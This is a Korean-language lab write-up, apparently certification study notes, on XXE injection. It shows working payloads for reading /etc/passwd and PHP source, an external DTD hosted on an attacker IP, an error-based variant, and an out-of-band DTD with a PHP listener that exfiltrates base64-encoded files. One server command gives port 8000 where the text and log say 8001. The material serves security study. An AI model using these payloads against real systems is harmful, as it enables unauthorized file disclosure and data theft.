---
title: "Web Attacks - XXE"
date: 2026-07-31
layout: single
excerpt: "XML Entity Injection을 식별하고 로컬 파일 읽기, PHP 소스 코드 노출, Error Based XXE, Blind OOB 데이터 유출로 확장하는 과정을 정리한다."
author_profile: true
toc: true
toc_label: "Web Attacks"
toc_icon: "book"
toc_sticky: true
categories: [cpts-web]
tags: [web, cpts, web-attacks, xxe]
---

XML Entity Injection을 식별하고 로컬 파일 읽기, PHP 소스 코드 노출, Error Based XXE, Blind OOB 데이터 유출로 확장하는 과정을 정리한다.

---

# XXE Introduction

XML External Entity(XXE) Injection 취약점은 사용자가 제어할 수 있는 입력으로부터 XML 데이터를 전달받으면서, 이를 적절히 필터링하지 않거나 안전하게 파싱하지 않을 때 발생한다.

이 경우 공격자는 XML의 기능을 악용하여 비정상적인 작업을 수행할 수 있다.

## XML and DTD Basics

XML 문서는 요소들이 트리 구조를 이루는 형태로 구성된다.

각 요소는 일반적으로 태그로 표현되며, 가장 처음에 위치한 요소를 Root Element라고 한다.

그 아래에 포함된 요소들은 Child Element라고 한다.

다음은 이메일 문서 구조를 표현한 기본적인 XML 예시다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```

XML DTD은 XML 문서가 미리 정의된 문서 구조를 따르는지 검증할 수 있도록 한다.

문서 구조는 다음 두 가지 방식으로 정의할 수 있다:

1. XML 문서 내부에 직접 정의
2. 외부 파일에 정의한 뒤 불러오기

다음은 앞에서 확인한 이메일 XML 문서에 대한 DTD 예시다:

```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

위 DTD에서는 `ELEMENT` 선언을 사용해 Root Element인 `email` 을 정의하고, 그 안에 포함될 하위 요소를 지정한다:

```xml
<!ELEMENT email (date, time, sender, recipients, body)>
```

일부 요소는 또 다른 하위 요소를 포함할 수 있으며, 일부 요소는 일반 텍스트 데이터만 포함한다:

```xml
<!ELEMENT date (#PCDATA)>
```

여기서 `#PCDATA` 는 해당 요소가 파싱 가능한 일반 문자 데이터를 포함한다는 의미다.

또는 `email.dtd` 와 같은 외부 파일에 저장한 뒤 `SYSTEM` 키워드를 사용하여 참조할 수도 있다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

URL을 통해 외부 DTD를 참조하는 것도 가능하다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```

다음과 같이 `test` 라는 Entity를 정의하면:

```xml
<!ENTITY test "This is a test string.">
```

XML 본문에서 `&test;` 로 참조할 수 있다:

```xml
<email>&test;</email>
```

---

# Local File Disclosure

대상 웹사이트는 다음과 같이 구성되어 있다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks1.png)

Burp Suite를 통해 요청을 확인한 결과, 사용자가 입력한 정보가 XML 형식으로 서버에 전달되고 있었다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks2.png)

응답에 입력한 이메일 주소인 `test@test.com` 이 그대로 출력되는 것으로 보아, `email` 요소의 값을 조작하여 Entity Injection이 가능한지 확인할 수 있다.

다음과 같이 `test` 라는 Entity를 정의하였다:

```xml
<!DOCTYPE email [
<!ENTITY test "This is a test string.">
]>
```

이후 `email` 요소에서 `&test;` 를 참조하였다:

```xml
<email>&test;</email>
```

요청을 전송하자 Entity에 정의한 문자열이 응답에 출력되었다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks3.png)

이를 통해 XML Parser가 사용자가 정의한 Entity를 확장하고 있음을 확인할 수 있다.

다음으로 `SYSTEM` 키워드를 사용하여 서버 내부의 `/etc/passwd` 파일을 참조하였다:

```xml
<!DOCTYPE email [
  <!ENTITY test SYSTEM "file:///etc/passwd">
]>
```

`email` 요소에서 `&test;` 를 참조하여 요청을 전송하자 `/etc/passwd` 의 내용이 응답에 출력되었다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks4.png)

이를 통해 XXE 취약점을 이용한 Local File Disclosure가 가능하다는 것을 확인하였다.

또한 대상 애플리케이션이 PHP로 작성되어 있으므로 `php://filter` Wrapper를 사용하여 PHP 소스 코드를 Base64로 인코딩한 상태로 읽을 수 있다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks5.png)

---

# Advanced File Disclosure

## CDATA and External DTD

PHP 애플리케이션에서는 `php://filter` 를 사용하여 소스 코드를 Base64로 인코딩할 수 있지만, 이 방법은 PHP 환경에서만 사용할 수 있다.

다른 환경에서는 CDATA를 사용하여 파일 내용을 XML Parser가 XML 문법으로 해석하지 않고 일반 문자 데이터로 처리하도록 만들 수 있다.

CDATA로 감싼 문자열 내부에서는 `<`, `>`, `&` 와 같은 대부분의 XML 특수문자가 일반 문자로 처리된다.

처음에는 다음과 같이 CDATA 시작 부분, 읽을 파일, CDATA 종료 부분을 하나의 Entity로 결합하는 방법을 생각할 수 있다:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

하지만 내부 DTD 영역에서는 Entity 선언 내부에서 다른 Entity를 결합하는 방식이 제한될 수 있으므로 정상적으로 처리되지 않는다.

이를 우회하기 위해 Entity를 조합하는 선언을 외부 DTD 파일에 작성한다.

먼저 공격자 시스템에 `xxe.dtd` 파일을 생성하였다:

```xml
<!ENTITY test "%begin;%file;%end;">
```

이 파일은 `%begin;`, `%file;`, `%end`; Parameter Entity를 조합하여 `test` 라는 일반 Entity를 정의한다.

다음 명령으로 `xxe.dtd` 파일을 제공할 웹 서버를 실행하였다:

```bash
$ python3 -m http.server 8000
```

이후 대상 서버에 다음 페이로드를 전송하였다:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/error/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://10.10.14.173:8000/xxe.dtd">
  %xxe;
]>
```

`%xxe;` 가 참조되면 대상 서버가 공격자 서버의 `xxe.dtd` 를 가져온다.

외부 DTD에 작성된 다음 선언이 처리되면서:

```xml
<!ENTITY test "%begin;%file;%end;">
```

개념적으로 다음과 같은 `test` Entity가 만들어진다:

```xml
<!ENTITY test "<![CDATA[
/var/www/html/error/submitDetails.php
]]>">
```

마지막으로 `email` 요소에서 일반 Entity인 `&test;` 를 참조한다:

```xml
<email>&test;</email>
```

요청을 전송하자 `submitDetails.php` 의 PHP 소스 코드가 응답에 출력되었다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks6.png)

## Error Based XXE

앞에서 확인한 `/error` 디렉터리에서는 XML 처리 오류가 응답에 출력되는 것을 확인할 수 있다.

일반적인 XXE처럼 Entity 값을 정상적인 응답에 출력할 수 없더라도, XML Parser가 발생시킨 오류 메시지에 파일 내용을 포함시키면 파일을 읽을 수 있다.

이는 Error Based SQL Injection에서 오류 메시지를 통해 데이터가 노출되는 방식과 비슷하다.

XML 본문에서 정의되지 않은 `&test;` Entity를 참조하자 다음과 같이 오류가 발생하였다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks7.png)

이 동작을 이용하여 의도적으로 잘못된 외부 Entity 주소를 생성하고, 해당 주소에 읽으려는 파일 내용을 포함시킬 수 있다.

먼저 공격자 시스템의 `xxe.dtd` 파일을 다음과 같이 작성하였다:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%test;/%file;'>">
```

첫 번째 줄은 대상 서버의 `/etc/hosts` 파일을 `%file;` Parameter Entity로 정의한다:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
```

두 번째 줄은 `content` 라는 일반 Entity를 선언하는 문자열을 `%error;` 에 저장한다:

```xml
<!ENTITY % error "<!ENTITY content SYSTEM '%test;/%file;'>">
```

`%error;` 가 처리되면 개념적으로 다음 선언이 만들어지려고 한다:

```xml
<!ENTITY content SYSTEM "%test;/127.0.0.1 localhost ...">
```

`%test;` 가 정의되어 있지 않아 정상적인 외부 Entity 선언이 만들어지지 않고, XML Parser가 이를 처리하는 과정에서 오류가 발생한다.

이때 `%file;` 로 삽입된 `/etc/hosts` 의 내용이 오류 메시지에 함께 포함되어 노출된다.

대상 서버에는 다음 페이로드를 전송하였다:

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://10.10.14.173:8000/xxe.dtd">
  %remote;
  %error;
]>
```

`%remote;` 는 공격자 서버에서 `xxe.dtd` 를 가져오고, 외부 DTD에 정의된 `%file;` 과 `%error;` 를 등록한다.

이후 `%error;` 를 참조하면 파일 내용이 포함된 잘못된 Entity 선언이 생성되면서 의도적인 XML 오류가 발생한다.

요청을 전송하자 오류 메시지에 `/etc/hosts` 의 내용이 출력되었다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks8.png)

---

# Blind Data Exfiltration

## OOB Data Exfiltration

이번에는 XML Entity의 값이 응답에 출력되지 않고, XML 또는 PHP 오류 메시지도 표시되지 않는 완전한 Blind XXE 환경이다.

이러한 상황에서는 OOB Data Exfiltration을 사용할 수 있다.

OOB는 대상 서버가 파일 내용을 웹 애플리케이션의 응답에 직접 출력하도록 만드는 대신, 공격자가 제어하는 외부 서버로 HTTP 요청을 보내도록 유도하여 데이터를 전달받는 방식이다.

먼저 공격자 시스템의 `xxe.dtd` 파일을 다음과 같이 작성하였다:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.173:8001/?content=%file;'>">
```

첫 번째 줄은 대상 서버의 `/etc/passwd` 파일을 Base64로 인코딩하여 `%file;` 에 저장한다:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

두 번째 줄은 공격자 서버로 HTTP 요청을 보내는 content Entity를 생성할 수 있도록 `%oob;` 를 정의한다:

```xml
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.14.173:8001/?content=%file;'>">
```

이후 공격자 서버에서 전달받은 Base64 데이터를 자동으로 디코딩하기 위해 다음 PHP 스크립트를 `index.php` 에 작성하였다:

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

이번 구성에서는 두 개의 웹 서버를 사용하였다.

먼저 `xxe.dtd` 파일을 제공하기 위해 `8000` 번 포트에서 Python 웹 서버를 실행한다:

```bash
$ python3 -m http.server 8000
```

그리고 PHP 스크립트가 작성된 디렉터리에서 데이터 수신용 PHP 서버를 `8001` 번 포트로 실행한다:

```bash
$ php -S 0.0.0.0:8000
```

이제 대상 서버에 다음 페이로드를 전송한다:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.14.173:8000/xxe.dtd">
  %remote;
  %oob;
]>
```

먼저 `%remote;` 가 공격자 서버의 `xxe.dtd` 를 가져온다:

```xml
<!ENTITY % remote SYSTEM "http://10.10.14.173:8000/xxe.dtd">
%remote;
```

외부 DTD가 로드되면 `%file;` 과 `%oob;` 가 정의된다.

이후 `%oob;` 가 처리되면서 `content` 라는 일반 Entity가 생성된다:

```xml
<!ENTITY content SYSTEM "http://10.10.14.173:8001/?content=<BASE64_DATA>">
```

마지막으로 XML 본문의 다음 부분에서 `&content;` 를 참조한다:

```xml
<email>&content;</email>
```

여기서 파일을 읽고 Base64로 인코딩하는 주체는 대상 서버이며, 공격자 PHP 서버는 전달받은 데이터를 디코딩하고 출력하는 역할만 수행한다.

요청을 전송해도 대상 웹 애플리케이션의 응답에는 파일 내용이 나타나지 않았다:

![Web Attacks](/assets/cpts-web/web-attacks-xxe/web-attacks9.png)

하지만 데이터 수신용 PHP 서버를 실행한 터미널을 확인하자 `/etc/passwd` 의 내용이 정상적으로 출력되었다:

```text
[Fri Jul 31 14:33:25 2026] PHP 8.4.6 Development Server (http://0.0.0.0:8001) started
[Fri Jul 31 14:33:27 2026] 10.129.152.6:48102 Accepted
[Fri Jul 31 14:33:27 2026] 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

# SKIP
```